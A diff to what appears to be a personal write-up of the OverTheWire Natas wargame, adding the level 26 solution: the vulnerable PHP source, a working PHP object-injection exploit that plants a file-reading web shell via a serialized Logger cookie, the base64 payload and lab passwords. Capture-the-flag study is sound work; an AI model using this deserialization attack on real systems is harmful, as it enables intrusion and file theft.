@@ -2506,6 +2506,7 @@ And the password for natas25 is `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`.
 Validate types and use `hash_equals()` for safe comparisons.
 
 ### Level 25
+
 - **Date**: 2026-04-21
 - **URL**: `http://natas25.natas.labs.overthewire.org`
 - **Password**: `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`
@@ -2849,10 +2850,227 @@ And at last we have the credentials for natas26!
 
 Don’t rely on string filtering to secure file inclusion—it’s trivial to bypass.
 
+## Levels 26 - 30
+
 ### Level 26
+
 - **Date**: 2026-04-22
 - **URL**: `http://natas26.natas.labs.overthewire.org`
 - **Password**: `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`
+- **Tools**: Web Browser, `PHP`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+```php
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"],
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) &&
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) &&
+                        array_key_exists("y2", $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+```
+
+Notice `$drawing=unserialize(base64_decode($_COOKIE["drawing"]));` in `drawFromUserdata()` and `storeData()`.
+- `unserialize()` is used to convert a string representation of a PHP value back into a PHP value, like an array or an **object**.
+- `$_COOKIE["drawing"]` is a **user-controlled** cookie value.
+So we can **inject a PHP object** by controlling the serialized drawing cookie.
+
+Notice the `Logger` class that is defined at the top of the source code.
+When an object of the `Logger` class is destroyed, its `__destruct()` method is called.
+And `__destruct()` **writes** `$exitMsg` to a **file** using `fwrite()`.
+
+So we generate a serialized `Logger` object where we control its properties, so that `__destruct()` writes our payload into a file when the object is destroyed.
+
+[level-26\logger_payload.php](level-26\logger_payload.php)
+```php
+<?php
+
+class Logger
+{
+  private $logFile;
+  private $initMsg;
+  private $exitMsg;
+
+  function __construct()
+  {
+    $this->logFile = "img/natas26_pass.php";
+    $this->initMsg = "init";
+    $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
+  }
+}
+
+// Create the object and wrap it in an array
+$o = new Logger();
+$payload = array($o);
+
+echo base64_encode(serialize($payload));
+```
+
+I chose `img/natas26_pass.php` as the file.
+
+Run `php level-26/logger_payload.php` to get the payload:
+```text
+YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMDoiaW1nL25hdGFzMjZfcGFzcy5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo0OiJpbml0IjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9fQ==
+```
+
+Open the browser's developer tools and set the `drawing` cookie to the payload value.
+
+Then refresh the page to trigger the payload.
+
+And go to `http://natas26.natas.labs.overthewire.org/img/natas26_pass.php` to see the password for natas27!
+```txt
+u3RRffXjysjgwFU6b9xa23i6prmUsYne
+```
+
+And the password for natas27 is `u3RRffXjysjgwFU6b9xa23i6prmUsYne`.
+
+#### The Lesson
+
+Don’t unserialize **untrusted** data — it allows object injection. Use safer formats like JSON instead.
+
+### Level 27
+
+- **Date**: 2026-04-22
+- **URL**: `http://natas27.natas.labs.overthewire.org`
+- **Password**: `u3RRffXjysjgwFU6b9xa23i6prmUsYne`
 - **Tools**: Web Browser
 
 #### The Solution
